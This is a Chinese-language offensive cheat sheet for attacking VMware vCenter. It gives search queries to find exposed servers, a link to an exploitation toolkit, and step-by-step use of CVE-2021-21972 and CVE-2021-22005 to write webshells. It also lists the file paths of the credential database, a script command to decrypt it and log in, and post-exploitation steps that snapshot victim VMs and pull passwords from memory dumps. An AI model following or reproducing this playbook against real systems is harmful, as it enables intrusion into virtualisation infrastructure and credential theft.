# vCenter 漏洞

## 资产搜索
title="+ ID_VC_Welcome +"  或者  app="vmware-vCenter"

## 综合利用工具
https://github.com/Schira4396/VcenterKiller/releases

## POC
### 查看版本信息
`/sdk/vimServiceVersions.xml`

### CVE-2021-21972 任意文件上传漏洞
- 影响版本：VMware vCenter Server: 7.0/6.7/6.5
- `/ui/vropspluginui/rest/services/updateova` 响应为405表示漏洞存在
- 使用脚本工具写入webshell:`python3 CVE-2021-21972 -url`
- vCenter cookie 保存位置：  
```
LINUX : /storage/db/vmware-vmdir/data.mdb
WINDOWS : C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb
```
- 使用脚本解密cookie文件：`python3 vcenter_saml_login.py -p data.mdb -t x.x.x.x`  
- 数据包添加cookie后登陆  
参考：https://github.com/NS-Sp4ce/CVE-2021-21972  
https://github.com/horizon3ai/vcenter_saml_login

### CVE-2021-22005 任意文件上传漏洞
- 影响版本：VMware vCenter Server 7.0/6.7/6.5/4.0/3.0
- 使用脚本工具写入webshell:`python3 CVE-2021-22005.py -u x.x.x.x`
参考：https://github.com/Jun-5heng/CVE-2021-22005

## 后续利用
获取vcenter服务器权限后：使用pysharpsphere或SharpSphere对指定目标机器拍摄快照，然后dump镜像到本地，使用Volatility直接对.vmem文件进行内存密码抓取。
参考：http://www.hackdig.com/07/hack-716736.htm